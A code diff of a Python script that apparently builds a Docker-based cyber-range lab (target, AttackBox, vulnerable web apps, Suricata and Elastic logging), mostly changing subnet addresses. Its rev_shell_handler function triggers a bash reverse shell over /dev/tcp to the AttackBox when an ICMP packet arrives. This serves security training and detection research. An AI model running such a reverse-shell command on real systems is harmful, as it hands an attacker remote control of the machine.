@@ -11,13 +11,13 @@ import psutil
 import argparse
 import binascii
 import requests
-import psycopg2
+#import psycopg2
 import subprocess
 import multiprocessing as mp
 
 from io import BytesIO
 from scapy.all import *
-from mysql.connector import connect, Error
+#from mysql.connector import connect, Error
 
 from ipaddress import ip_network, ip_address
 
@@ -35,22 +35,18 @@ pcap_file = "capture_{}.pcap".format(time.strftime("%d%m%Y"))
 output_fldr = "{}/output_files/{}".format(dir_path,time.strftime("%d-%m-%Y_%H%M"))
 
 class Container:
-    #def __init__(self, name, image, ipv4_addr, svc_check, default_port, run_as_user, command, environment=[], volumes=[], capabilities=[]):
-    def __init__(self, name, image, ipv4_addr=None, svc_check=None, default_port=None, run_as_user=None, command=None, environment=None, volumes=None, capabilities=None, devices=None, **kw):
-
-        #key_word_args = ["ipv4_addr","svc_check","default_port","run_as_user","command","environment", "volumes", "capabilities"]
-
+    def __init__(self, name, image, **kwargs):
         self.name = name
         self.image = image
-        self.ipv4_addr = ipv4_addr
-        self.svc_check = svc_check
-        self.default_port = default_port
-        self.run_as_user = run_as_user
-        self.command = command
-        self.environment = environment
-        self.volumes = volumes
-        self.capabilities = capabilities
-        self.devices = devices
+        self.ipv4_addr = kwargs.get("ipv4_addr")
+        self.svc_check = kwargs.get("svc_check")
+        self.default_port = kwargs.get("default_port")
+        self.run_as_user = kwargs.get("run_as_user")
+        self.command = kwargs.get("command")
+        self.environment = kwargs.get("environment", [])
+        self.volumes = kwargs.get("volumes", [])
+        self.capabilities = kwargs.get("capabilities", [])
+        self.devices = kwargs.get("devices", [])
 
 def log_clean_up():
     with open("{}/resource_files/{}".format(dir_path,pcap_file), 'rb') as f:
@@ -75,8 +71,8 @@ def log_clean_up():
             with open(file, 'r') as file_in :
                 filedata = file_in.read()
 
-            filedata = filedata.replace('"172.18.0.1"', '"172.18.0.157"')
-            filedata = filedata.replace('172.18.0.1:', '172.18.0.157:')
+            filedata = filedata.replace('"172.28.0.1"', '"172.28.0.157"')
+            filedata = filedata.replace('172.28.0.1:', '172.28.0.157:')
 
             with open("{}/{}".format(output_fldr,os.path.basename(file)), 'w') as file_out:
                 file_out.write(filedata)
@@ -93,17 +89,17 @@ def log_clean_up():
     
     # Need to dynamically pull the filebeat indices and then we should be good to just parse as a docker command
     
-    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
-    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
-    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.18.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_mapping.json --type=mapping
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp ^Casticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_analyzer.json --type=analyzer
+    #docker run --rm -it --name=elasticdump --net=uwe_tek_external -v $(pwd):/tmp elasticdump/elasticsearch-dump --input=http://172.28.0.10:9200/filebeat-7.17.2-2022.08.22-000001 --output=/tmp/filebeat_data.json --type=data
 
     
     print("\nShutting down - Output files saved in {}".format(output_fldr))
 
 
 def clean_exit(sig, frame):
-    #ac120001 = 172.18.0.1 - Host (browser activity etc)
-    #ac12009d = 172.18.0.157 - AttackBox
+    #ac120001 = 172.28.0.1 - Host (browser activity etc)
+    #ac12009d = 172.28.0.157 - AttackBox
     
     log_clean_up()
 
@@ -165,7 +161,7 @@ def rev_shell_handler(target_os):
         if Ether in Ether(data):
             print(data)
             if ICMP in pkt:
-                cmd_in_container = api_client.exec_create(target_os, "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1")
+                cmd_in_container = api_client.exec_create(target_os, "/bin/bash -i >& /dev/tcp/172.28.0.157/4242 0>&1")
                 result = api_client.exec_start(cmd_in_container, detach=True)
                  
 
@@ -177,7 +173,7 @@ def get_uwe_net_interface():
     
     for key, val in addrs.items():
         for i in val:
-            if "172.18.0.1" in i:
+            if "172.28.0.1" in i:
                 uwe_net_interface = key
                 break
     
@@ -215,10 +211,10 @@ def container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):
 
             network_name = ""
 
-            if ip_address(Container.ipv4_addr) in ip_network("172.18.0.0/24"):
+            if ip_address(Container.ipv4_addr) in ip_network("172.28.0.0/24"):
                 network_name = "uwe_tek_external"
 
-            if ip_address(Container.ipv4_addr) in ip_network("172.19.0.0/24"):
+            if ip_address(Container.ipv4_addr) in ip_network("172.29.0.0/24"):
                 network_name = "uwe_tek_internal"
 
             docker_client.networks.get(network_name).connect(Container.name,ipv4_address=Container.ipv4_addr)
@@ -336,36 +332,36 @@ if __name__ == '__main__':
     if target_os not in supported_os:
         exit("{} is not a support os. Please select a supported OS:\n{}".format(target_os,str(supported_os)))
 
-    mysql_container = Container("mysql", "uwe_mysql:101", ipv4_addr="172.18.0.6", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    mysql_container = Container("mysql", "uwe_mysql:101", ipv4_addr="172.28.0.6", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
 
-    phpmyadmin_container = Container("phpmyadmin", "phpmyadmin:5.2.0", ipv4_addr="172.18.0.14", svc_check="http://172.18.0.14", environment=["PMA_HOST={}".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    phpmyadmin_container = Container("phpmyadmin", "phpmyadmin:5.2.0", ipv4_addr="172.28.0.14", svc_check="http://172.28.0.14", environment=["PMA_HOST={}".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
 
-    joomla_container = Container("joomla", "uwe_joomla:101", ipv4_addr="172.18.0.15", svc_check="http://172.18.0.15", environment=["JOOMLA_DB_HOST={}:3306".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    joomla_container = Container("joomla", "uwe_joomla:101", ipv4_addr="172.28.0.15", svc_check="http://172.28.0.15", environment=["JOOMLA_DB_HOST={}:3306".format(mysql_container.ipv4_addr)], volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
     
-    postgres_container = Container("postgres", "uwe_postgres:101", ipv4_addr="172.18.0.5", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    postgres_container = Container("postgres", "uwe_postgres:101", ipv4_addr="172.28.0.5", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
 
-    confluence_container = Container("confluence", "uwe_confluence:101", svc_check="http://172.18.0.16:8090")
+    confluence_container = Container("confluence", "uwe_confluence:101", svc_check="http://172.28.0.16:8090")
 
-    tomcat_container = Container("tomcat", "uwe_tomcat:101", svc_check="http://172.18.0.17:8080")
+    tomcat_container = Container("tomcat", "uwe_tomcat:101", svc_check="http://172.28.0.17:8080")
 
-    wordpress_container = Container("wordpress", "uwe_wordpress:101", ipv4_addr="172.18.0.18", svc_check="http://172.18.0.18", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    wordpress_container = Container("wordpress", "uwe_wordpress:101", ipv4_addr="172.28.0.18", svc_check="http://172.28.0.18", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
 
-    httpd_container = Container("httpd", "uwe_httpd:101", ipv4_addr="172.19.0.11", volumes=['{}/resource_files/Custom_Containers/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), 
+    httpd_container = Container("httpd", "uwe_httpd:101", ipv4_addr="172.29.0.11", volumes=['{}/resource_files/Custom_Containers/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), 
         '{}/resource_files/Custom_Containers/htdocs:/usr/local/apache2/htdocs/'.format(dir_path),
         "/etc/timezone:/etc/timezone:ro",
         "/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
 
-    dnsmasq_container = Container("dnsmasq", "uwe_dnsmasq:101", ipv4_addr="172.19.0.53", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
+    dnsmasq_container = Container("dnsmasq", "uwe_dnsmasq:101", ipv4_addr="172.29.0.53", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
 
-    opensmtpd_container = Container("opensmtpd", "uwe_opensmtpd:101", ipv4_addr="172.19.0.25", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
+    opensmtpd_container = Container("opensmtpd", "uwe_opensmtpd:101", ipv4_addr="172.29.0.25", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"], capabilities=["NET_ADMIN","NET_RAW"])
 
-    random_traffic_container = Container("random_traffic", "uwe_traffic_generator:101", ipv4_addr="172.18.0.42", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"],command='172.18.0.18 "home;index;hello;wp-admin"')
+    random_traffic_container = Container("random_traffic", "uwe_traffic_generator:101", ipv4_addr="172.28.0.42", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"],command='172.28.0.18 "home;index;hello;wp-admin"')
 
-    target_container = Container("target", "uwe_{}:101".format(target_os), ipv4_addr="172.18.0.200", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
+    target_container = Container("target", "uwe_{}:101".format(target_os), ipv4_addr="172.28.0.200", volumes=["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro"])
 
     attackbox_container = Container("AttackBox", "uwe_attackbox:101") 
 
-    filebeat_container = Container("filebeat", "docker.elastic.co/beats/filebeat:7.17.2", ipv4_addr="172.18.0.12", run_as_user="root", command="-strict.perms=false", environment=["output.elasticsearch.hosts=['172.18.0.10:9200']"], volumes=['{}/resource_files/Custom_Containers/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), 
+    filebeat_container = Container("filebeat", "docker.elastic.co/beats/filebeat:7.17.2", ipv4_addr="172.28.0.12", run_as_user="root", command="-strict.perms=false", environment=["output.elasticsearch.hosts=['172.28.0.10:9200']"], volumes=['{}/resource_files/Custom_Containers/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), 
         '{}/resource_files/Custom_Containers/Configs/filebeat_suricata.yml:/usr/share/filebeat/modules.d/suricata.yml:ro'.format(dir_path),
         '{}/resource_files/logfiles:/var/log/suricata/:ro'.format(dir_path),
         '/var/lib/docker/containers:/var/lib/docker/containers:ro', 
@@ -375,9 +371,9 @@ if __name__ == '__main__':
 
     suricata_container = Container("suricata", "uwe_suricata:101")
 
-    elasticsearch_container = Container("elasticsearch", "elasticsearch:7.17.2", ipv4_addr="172.18.0.10", svc_check="http://172.18.0.10:9200", default_port="9200", environment=["discovery.type=single-node"], volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
+    elasticsearch_container = Container("elasticsearch", "elasticsearch:7.17.2", ipv4_addr="172.28.0.10", svc_check="http://172.28.0.10:9200", default_port="9200", environment=["discovery.type=single-node"], volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
 
-    kibana_container = Container("kibana", "kibana:7.17.2", ipv4_addr="172.18.0.11", svc_check="http://172.18.0.11:5601/status", default_port="5601", volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
+    kibana_container = Container("kibana", "kibana:7.17.2", ipv4_addr="172.28.0.11", svc_check="http://172.28.0.11:5601/status", default_port="5601", volumes=["/etc/timezone:/etc/timezone:ro", "/etc/localtime:/etc/localtime:ro"])
         
     containers_to_run ={
 
@@ -385,8 +381,8 @@ if __name__ == '__main__':
         #"phpmyadmin":[phpmyadmin_container,True,[],[]],
         #"joomla":[joomla_container,True,[],[]],
         "postgres":[postgres_container,True,[],[]],
-        "confluence":[confluence_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name confluence --net uwe_tek_external --ip 172.18.0.16 -it uwe_confluence:101'],["nohup bash /tomcat_to_stdout.sh &"]],
-        "tomcat":[tomcat_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name tomcat --net uwe_tek_external --ip 172.18.0.17 -it uwe_tomcat:101'],["nohup bash /tomcat_to_stdout.sh &"]],
+        "confluence":[confluence_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name confluence --net uwe_tek_external --ip 172.28.0.16 -it uwe_confluence:101'],["nohup bash /tomcat_to_stdout.sh &"]],
+        "tomcat":[tomcat_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro --name tomcat --net uwe_tek_external --ip 172.28.0.17 -it uwe_tomcat:101'],["nohup bash /tomcat_to_stdout.sh &"]],
         "wordpress":[wordpress_container,True,[],[]],
         #"httpd":[httpd_container,True,[],[]],
         #"dnsmasq":[dnsmasq_container,True,[],[]],
@@ -398,8 +394,8 @@ if __name__ == '__main__':
     required_containers ={
 
         "target":[target_container,True,[],[]],
-        "attackbox":[attackbox_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -v {}/exploit_material/:/exploit_material/ --name AttackBox --net uwe_tek_external --ip 172.18.0.157 --cap-add=NET_ADMIN --cap-add=NET_RAW -it uwe_attackbox:101'.format(dir_path)],["rsyslogd"]],
-        #"filebeat":[filebeat_container,True,["run",'docker run --rm --name=filebeat_setup --net uwe_tek_external --ip 172.18.0.9 docker.elastic.co/beats/filebeat:7.17.2 setup -E setup.kibana.host=172.18.0.11:5601 -E output.elasticsearch.hosts=["172.18.0.10:9200"]'],[]],
+        "attackbox":[attackbox_container,False,["popen",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -v {}/exploit_material/:/exploit_material/ --name AttackBox --net uwe_tek_external --ip 172.28.0.157 --cap-add=NET_ADMIN --cap-add=NET_RAW -it uwe_attackbox:101'.format(dir_path)],["rsyslogd"]],
+        #"filebeat":[filebeat_container,True,["run",'docker run --rm --name=filebeat_setup --net uwe_tek_external --ip 172.28.0.9 docker.elastic.co/beats/filebeat:7.17.2 setup -E setup.kibana.host=172.28.0.11:5601 -E output.elasticsearch.hosts=["172.28.0.10:9200"]'],[]],
         "suricata":[suricata_container,False,["run",'docker run -v /etc/timezone:/etc/timezone:ro -v /etc/localtime:/etc/localtime:ro -d --name suricata --net=host --cap-add=net_admin --cap-add=net_raw --cap-add=sys_nice -v {}/resource_files/logfiles:/var/log/suricata uwe_suricata:101 -i {}'.format(dir_path,get_uwe_net_interface())],[]],
         #"elasticsearch":[elasticsearch_container,True,[],[]],
         #"kibana":[kibana_container,True,[],[]],
@@ -432,6 +428,6 @@ if __name__ == '__main__':
     if not os.path.isdir(output_fldr):
         os.makedirs(output_fldr)
         
-    process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/24', 'and', 'dst', 'net', '172.18.0.0/24', 'and', 'host', 'not', '172.18.0.10', 'and', 'host', 'not', '172.18.0.11', 'and', 'host', 'not', '172.18.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+    process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.28.0.0/24', 'and', 'dst', 'net', '172.28.0.0/24', 'and', 'host', 'not', '172.28.0.10', 'and', 'host', 'not', '172.28.0.11', 'and', 'host', 'not', '172.28.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
     
     print(process.stdout.read())
